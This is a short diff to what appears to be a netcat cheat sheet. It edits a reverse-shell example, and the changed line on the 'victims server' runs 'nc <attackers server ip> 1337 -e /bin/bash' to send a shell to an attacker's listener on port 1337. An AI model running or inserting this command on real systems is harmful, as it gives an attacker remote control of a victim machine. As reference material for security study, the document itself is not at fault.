@@ -32,7 +32,7 @@ nc -lvvnp 1337
 ```
 On victims server
 ```
-nc <server> 1337 -e /bin/bash
+nc <attackers server ip> 1337 -e /bin/bash
 ```
 
 Netcat - Check if a port is open
